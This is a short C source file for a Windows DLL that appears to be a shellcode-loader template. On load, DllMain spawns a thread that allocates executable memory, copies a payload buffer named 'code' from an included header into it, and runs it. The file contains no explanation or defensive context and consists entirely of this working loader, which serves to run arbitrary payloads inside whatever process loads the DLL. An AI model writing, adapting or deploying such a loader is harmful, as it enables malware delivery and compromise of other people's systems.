#include <windows.h>
#include "template.h"
DWORD WINAPI Threadf(LPVOID lpParameter)
{
	LPVOID newMem;
	HANDLE currentps;
	SIZE_T bytes;
	BOOL check = FALSE;
	currentps = GetCurrentProcess(); //get current process handler
	newMem = VirtualAllocEx(currentps, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(newMem == NULL)
		return -1;
	check = WriteProcessMemory(currentps, newMem, (LPVOID)&code, SCSIZE, &bytes);
	if(!check)
		return -2;
	((void(*)())newMem)();
		return 1;
}
BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE threadH;
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            threadH = CreateThread(NULL, 0, Threadf, NULL, 0, NULL);
           // CloseHandle(threadH);
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

       case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
} 

